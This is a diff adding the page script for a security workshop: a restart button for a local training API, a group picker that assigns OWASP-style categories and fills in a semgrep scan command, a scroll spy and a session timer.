+      })['catch'](function(){ return delay(400).then(poll); });
+    }
+    return poll();
+  }
+  function finishResetApp(){
+    resetAppBusy=false; resetAppBtn.disabled=false;
+    resetAppBtn.textContent=resetAppLabel; resetAppBtn.title=resetAppTitle;
+  }
+  resetAppBtn.addEventListener('click', function(){
+    if(resetAppBusy) return;
+    if(!resetAppArmed){
+      resetAppArmed=true; resetAppBtn.textContent='Click again to restart';
+      resetAppT=setTimeout(function(){ resetAppArmed=false; resetAppBtn.textContent=resetAppLabel; }, 3000);
+      return;
+    }
+    clearTimeout(resetAppT); resetAppArmed=false; resetAppBusy=true;
+    resetAppBtn.disabled=true; resetAppBtn.textContent='Restarting…';
+    clearApiCalls();
+    var previous=null;
+    readInstance()['catch'](function(){ return null; }).then(function(id){
+      previous=id;
+      var ctrl=new AbortController();
+      var kill=setTimeout(function(){ ctrl.abort(); }, 8000);
+      return fetch(base()+'/workshop/reset', {method:'POST', mode:'cors', cache:'no-store', signal:ctrl.signal})
+        ['finally'](function(){ clearTimeout(kill); });
+    })['catch'](function(){ /* the process may exit before the response arrives */ })
+      .then(function(){ return waitForRestart(previous); })
+      .then(function(){
+        resetAppBtn.textContent='Restarted';
+        setTimeout(finishResetApp, 1600);
+      })['catch'](function(){
+        resetAppBtn.textContent='Restart failed';
+        resetAppBtn.title='Timed out waiting for the API on '+base()+'. Start it with dotnet run --project Aviato.API. Once the A05 allow-list is in place, this page can no longer call the API.';
+        setTimeout(finishResetApp, 3200);
+      });
+  });
+
+
+  /* ---------- group picker: which categories are mine? ---------- */
+  var GROUP_KEY='aviato-group-v1';
+  var LAYOUTS={
+    '3':{1:['a01','a05'],2:['a02','a07'],3:['a03','a09']},
+    '4':{1:['a01'],2:['a02'],3:['a03','a09'],4:['a05','a07']},
+    '6':{1:['a01'],2:['a02'],3:['a03'],4:['a05'],5:['a07'],6:['a09']}
+  };
+  var CATS={a01:'A01 Broken Access Control',a02:'A02 Cryptographic Failures',a03:'A03 SQL Injection',
+            a05:'A05 Misconfiguration',a07:'A07 Auth Failures',a09:'A09 Sensitive Logging'};
+  var RULES={a01:'A01_broken_access_control',a02:'A02_cryptographic_failures',a03:'A03_injection',
+             a05:'A05_security_misconfiguration',a07:'A07_auth_failures',a09:'A09_logging_failures'};
+  var group={layout:'4', n:null};
+  try{ var g=JSON.parse(localStorage.getItem(GROUP_KEY)||'null'); if(g && LAYOUTS[g.layout]) group=g; }catch(e){}
+  function saveGroup(){ try{ localStorage.setItem(GROUP_KEY, JSON.stringify(group)); }catch(e){} }
+  function groupOf(cat){
+    var L=LAYOUTS[group.layout];
+    for(var k in L){ if(L[k].indexOf(cat)>=0) return k; }
+    return null;
+  }
+  function catLinks(cats){
+    return cats.map(function(c){ return '<a href="#'+c+'">'+CATS[c]+'</a>'; }).join(' · ');
+  }
+  function renderGroup(){
+    var L=LAYOUTS[group.layout], keys=Object.keys(L);
+    if(group.n && !L[group.n]) group.n=null;
+    var mine=group.n ? L[group.n] : [];
+
+    [].slice.call(document.querySelectorAll('#layoutPicker button')).forEach(function(b){
+      b.classList.toggle('on', b.getAttribute('data-layout')===group.layout);
+    });
+    var gp=document.getElementById('groupPicker');
+    [].slice.call(gp.querySelectorAll('button')).forEach(function(b){ b.remove(); });
+    keys.forEach(function(k){
+      var b=document.createElement('button'); b.type='button'; b.textContent=k;
+      b.classList.toggle('on', String(group.n)===k);
+      b.addEventListener('click', function(){ group.n=k; saveGroup(); renderGroup(); });
+      gp.appendChild(b);
+    });
+
+    var tb=document.querySelector('#assignTable tbody'); tb.innerHTML='';
+    keys.forEach(function(k){
+      var tr=document.createElement('tr'); if(String(group.n)===k) tr.className='mine';
+      tr.innerHTML='<td>Group '+k+'</td><td>'+catLinks(L[k])+'</td>'; tb.appendChild(tr);
+    });
+
+    [].slice.call(document.querySelectorAll('[data-grp-for]')).forEach(function(el){
+      el.textContent='Group '+groupOf(el.getAttribute('data-grp-for'));
+    });
+    [].slice.call(document.querySelectorAll('section.brief')).forEach(function(sec){
+      var c=sec.getAttribute('data-cat');
+      sec.classList.toggle('mine', mine.indexOf(c)>=0);
+      sec.classList.toggle('theirs', !!group.n && mine.indexOf(c)<0);
+    });
+    [].slice.call(document.querySelectorAll('#nav a[data-sec]')).forEach(function(a){
+      a.classList.toggle('mine', mine.indexOf(a.getAttribute('data-sec'))>=0);
+    });
+
+    var box=document.getElementById('mineBox');
+    box.innerHTML = group.n
+      ? '<b>You are group '+group.n+'</b> of '+keys.length+'. Your categories: '+catLinks(mine)+'. You present '+(group.n==='1'?'first':'as group '+group.n)+'.'
+      : '<span class="none">No group picked yet.</span>';
+
+    var scan=document.getElementById('myScan'), note=document.getElementById('myScanNote');
+    if(group.n){
+      scan.textContent='semgrep '+mine.map(function(c){ return '--config semgrep-rules/'+RULES[c]+'.yml'; }).join(' \\\n  ')+' \\\n  Aviato.API/ Aviato.Infrastructure/';
+      note.textContent = (mine.indexOf('a01')>=0 && mine.indexOf('a05')<0)
+        ? 'Your scan also reports /debug/config — that one belongs to the group with A05. The IDOR never shows up: add it to the agent\'s task yourselves.'
+        : (mine.indexOf('a01')>=0 ? 'The IDOR never shows up in the scan: add it to the agent\'s task yourselves.' : 'Group '+group.n+' · '+mine.map(function(c){return CATS[c];}).join(' + '));
+    }else{
+      scan.textContent='semgrep --config semgrep-rules/<your rule files>.yml \\\n  Aviato.API/ Aviato.Infrastructure/';
+      note.textContent='Pick your group above and this command fills itself in.';
+    }
+    updateProgress();
+  }
+  [].slice.call(document.querySelectorAll('#layoutPicker button')).forEach(function(b){
+    b.addEventListener('click', function(){ group.layout=b.getAttribute('data-layout'); group.n=null; saveGroup(); renderGroup(); });
+  });
+
+  /* ---------- scroll spy ---------- */
+  var navLinks=[].slice.call(document.querySelectorAll('#nav a[data-sec]'));
+  var secEls=navLinks.map(function(a){return document.getElementById(a.getAttribute('data-sec'));}).filter(Boolean);
+  function spy(){
+    var y=window.scrollY+120, cur=null;
+    secEls.forEach(function(s){ if(s.offsetTop<=y) cur=s.id; });
+    navLinks.forEach(function(a){ a.classList.toggle('active', a.getAttribute('data-sec')===cur); });
+  }
+  window.addEventListener('scroll', spy, {passive:true});
+
+  /* ---------- timer ---------- */
+  var TOTAL=3*60*60; // seconds
+  var timerStart=null;
+  try{ var tv=localStorage.getItem(TIMER_KEY); if(tv) timerStart=parseInt(tv,10)||null; }catch(e){}
+  var clock=document.getElementById('clock'), btn=document.getElementById('timerBtn'), phase=document.getElementById('phase');
+  var timerArmed=false, timerArmT=null;
+
+  function fmt(s){ if(s<0)s=0; var h=Math.floor(s/3600),m=Math.floor(s%3600/60),ss=s%60;
+    return (h>0?h+':':'')+(m<10&&h>0?'0':'')+m+':'+(ss<10?'0':'')+ss; }
+  function phaseLabel(el){
+    var m=el/60;
+    if(m<10) return 'Setup · form groups';
+    if(m<20) return 'See · live demos';
+    if(m<25) return 'Scan together';
+    if(m<55) return 'Group work';
+    if(m<65) return 'Group work · build your talk';
+    if(m<90) return 'Presentations';
+    if(el<95*60) return '◆ Checkpoint 1';
+    if(el<TOTAL) return 'Part 2 · Supply chain';
+    return 'Time — wrap up';
+  }
+  function render(){
+    if(timerStart){
+      var el=Math.floor((Date.now()-timerStart)/1000);
+      clock.textContent=fmt(el);
+      phase.textContent=phaseLabel(el)+' · '+fmt(Math.max(0,TOTAL-el))+' left';
+      if(!timerArmed) btn.textContent='Reset timer';
+    }else{
+      clock.textContent='00:00'; phase.textContent='3-hour session'; if(!timerArmed) btn.textContent='Start';
+    }
+  }
+  btn.addEventListener('click', function(){
+    if(!timerStart){
+      timerStart=Date.now(); try{localStorage.setItem(TIMER_KEY,String(timerStart));}catch(e){}
+      render(); return;
+    }
+    // running → two-click confirm to reset
+    if(!timerArmed){
+      timerArmed=true; btn.textContent='Confirm reset';
+      timerArmT=setTimeout(function(){ timerArmed=false; render(); }, 3000);
+      return;
+    }
+    clearTimeout(timerArmT); timerArmed=false;
+    timerStart=null; try{localStorage.removeItem(TIMER_KEY);}catch(e){}
+    render();
+  });
+  setInterval(function(){ if(timerStart) render(); }, 1000);
+
+  /* ---------- init ---------- */
+  render(); renderGroup(); spy();
+})();
+</script>
+</body>
+</html>
